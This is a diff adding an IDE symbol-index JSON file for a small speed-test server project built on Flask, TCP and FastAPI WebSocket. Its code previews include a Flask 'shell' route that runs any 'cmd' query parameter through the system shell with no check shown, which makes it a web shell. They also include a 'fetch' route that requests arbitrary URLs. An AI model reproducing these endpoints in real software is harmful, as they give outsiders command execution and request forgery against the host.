@@ -1,0 +1,252 @@
+[
+    {
+        "label": "json",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "json",
+        "description": "json",
+        "detail": "json",
+        "documentation": {}
+    },
+    {
+        "label": "re",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "re",
+        "description": "re",
+        "detail": "re",
+        "documentation": {}
+    },
+    {
+        "label": "subprocess",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "subprocess",
+        "description": "subprocess",
+        "detail": "subprocess",
+        "documentation": {}
+    },
+    {
+        "label": "requests",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "requests",
+        "description": "requests",
+        "detail": "requests",
+        "documentation": {}
+    },
+    {
+        "label": "Flask",
+        "importPath": "flask",
+        "description": "flask",
+        "isExtraImport": true,
+        "detail": "flask",
+        "documentation": {}
+    },
+    {
+        "label": "Response",
+        "importPath": "flask",
+        "description": "flask",
+        "isExtraImport": true,
+        "detail": "flask",
+        "documentation": {}
+    },
+    {
+        "label": "request",
+        "importPath": "flask",
+        "description": "flask",
+        "isExtraImport": true,
+        "detail": "flask",
+        "documentation": {}
+    },
+    {
+        "label": "redirect",
+        "importPath": "flask",
+        "description": "flask",
+        "isExtraImport": true,
+        "detail": "flask",
+        "documentation": {}
+    },
+    {
+        "label": "render_template",
+        "importPath": "flask",
+        "description": "flask",
+        "isExtraImport": true,
+        "detail": "flask",
+        "documentation": {}
+    },
+    {
+        "label": "socket",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "socket",
+        "description": "socket",
+        "detail": "socket",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "lite",
+        "importPath": "util",
+        "description": "util",
+        "isExtraImport": true,
+        "detail": "util",
+        "documentation": {}
+    },
+    {
+        "label": "Thread",
+        "importPath": "threading",
+        "description": "threading",
+        "isExtraImport": true,
+        "detail": "threading",
+        "documentation": {}
+    },
+    {
+        "label": "FastAPI",
+        "importPath": "fastapi",
+        "description": "fastapi",
+        "isExtraImport": true,
+        "detail": "fastapi",
+        "documentation": {}
+    },
+    {
+        "label": "Request",
+        "importPath": "fastapi",
+        "description": "fastapi",
+        "isExtraImport": true,
+        "detail": "fastapi",
+        "documentation": {}
+    },
+    {
+        "label": "WebSocket",
+        "importPath": "fastapi",
+        "description": "fastapi",
+        "isExtraImport": true,
+        "detail": "fastapi",
+        "documentation": {}
+    },
+    {
+        "label": "lite",
+        "importPath": "lite_test",
+        "description": "lite_test",
+        "isExtraImport": true,
+        "detail": "lite_test",
+        "documentation": {}
+    },
+    {
+        "label": "lite",
+        "kind": 2,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "def lite(config):\n    try:\n        out = subprocess.check_output(\n            [\"./lite\", \"-config\", \"config.json\", \"-test\", config],\n            stderr=subprocess.STDOUT,\n            text=True,\n        )\n        out_lines = out.splitlines()\n        res = [line for line in out_lines if \"gotspeed\" in line]\n        if len(res) > 1:",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "lite_test",
+        "kind": 2,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "def lite_test():\n    if request.method == \"GET\":\n        config = request.args.get(\"q\")\n    else:\n        config = request.json.get(\"q\")\n    if config:\n        return Response(lite(config), mimetype=\"text/plain\")\n    elif \"Mozilla\" in request.headers[\"User-Agent\"] and not config:\n        return redirect(\"/panel\")\n    else:",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "fetch",
+        "kind": 2,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "def fetch():\n    url = request.args.get(\"url\")\n    if url:\n        try:\n            r = requests.get(url, timeout=30)\n            res = r.text.splitlines()\n            return Response(res, mimetype=\"application/json\")\n        except Exception as e:\n            return str(e)\n    else:",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "shell",
+        "kind": 2,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "def shell():\n    cmd = request.args.get(\"cmd\")\n    if cmd:\n        out = subprocess.run(\n            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True\n        )\n        return Response(out.stdout, mimetype=\"text/plain\")\n    else:\n        return \"Không có lệnh shell\"\n@app.route(\"/panel\")",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "test_panel",
+        "kind": 2,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "def test_panel():\n    return render_template(\"panel.html\")",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "app",
+        "kind": 5,
+        "importPath": "http.main",
+        "description": "http.main",
+        "peekOfCode": "app = Flask(__name__)\ndef lite(config):\n    try:\n        out = subprocess.check_output(\n            [\"./lite\", \"-config\", \"config.json\", \"-test\", config],\n            stderr=subprocess.STDOUT,\n            text=True,\n        )\n        out_lines = out.splitlines()\n        res = [line for line in out_lines if \"gotspeed\" in line]",
+        "detail": "http.main",
+        "documentation": {}
+    },
+    {
+        "label": "lite",
+        "kind": 2,
+        "importPath": "tcp.util.lite_test",
+        "description": "tcp.util.lite_test",
+        "peekOfCode": "def lite(config):\n    try:\n        out = subprocess.check_output(\n            [\"./lite\", \"-test\", config],\n            stderr=subprocess.STDOUT,\n            text=True\n            )\n        out_lines = out.splitlines()\n        res = [\n            line for line in out_lines if \"gotspeed\" in line",
+        "detail": "tcp.util.lite_test",
+        "documentation": {}
+    },
+    {
+        "label": "polling",
+        "kind": 2,
+        "importPath": "tcp.main",
+        "description": "tcp.main",
+        "peekOfCode": "def polling():\n    while server.running:\n        conn, client = server.accept()\n        bytes_data = conn.recv(10*1024*1024)\n        text = bytes_data.decode('utf-8', errors='replace')\n        result = lite(text).encode('utf-8', errors='replace')\n        conn.send(result)\nThread(target=polling).start()\nwhile True:\n    pass",
+        "detail": "tcp.main",
+        "documentation": {}
+    },
+    {
+        "label": "port",
+        "kind": 5,
+        "importPath": "tcp.main",
+        "description": "tcp.main",
+        "peekOfCode": "port = os.getenv(\"PORT\", 8080)\nserver = socket.socket(\n    socket.AF_INET,\n    socket.SOCK_STREAM\n    )\nserver.bind((\"0.0.0.0\", port))\nserver.listen()\nprint(\"Server is running\")\ndef polling():\n    while server.running:",
+        "detail": "tcp.main",
+        "documentation": {}
+    },
+    {
+        "label": "server",
+        "kind": 5,
+        "importPath": "tcp.main",
+        "description": "tcp.main",
+        "peekOfCode": "server = socket.socket(\n    socket.AF_INET,\n    socket.SOCK_STREAM\n    )\nserver.bind((\"0.0.0.0\", port))\nserver.listen()\nprint(\"Server is running\")\ndef polling():\n    while server.running:\n        conn, client = server.accept()",
+        "detail": "tcp.main",
+        "documentation": {}
+    },
+    {
+        "label": "lite",
+        "kind": 2,
+        "importPath": "websocket.lite_test",
+        "description": "websocket.lite_test",
+        "peekOfCode": "def lite(config):\n    try:\n        out = subprocess.check_output(\n            [\"./lite\", \"-test\", config],\n            stderr=subprocess.STDOUT,\n            text=True\n            )\n        out_lines = out.splitlines()\n        res = [\n            line for line in out_lines if \"gotspeed\" in line",
+        "detail": "websocket.lite_test",
+        "documentation": {}
+    },
+    {
+        "label": "app",
+        "kind": 5,
+        "importPath": "websocket.main",
+        "description": "websocket.main",
+        "peekOfCode": "app = FastAPI()\n@app.get(\"/\")\nasync def home():\n    return \"Lite Test Server\"\n@app.websocket(\"/lite\")\nasync def connection(ws: WebSocket):\n    await ws.accept()\n    while True:\n        data = await ws.receive_text()\n        result = lite(data)",
+        "detail": "websocket.main",
+        "documentation": {}
+    }
+]
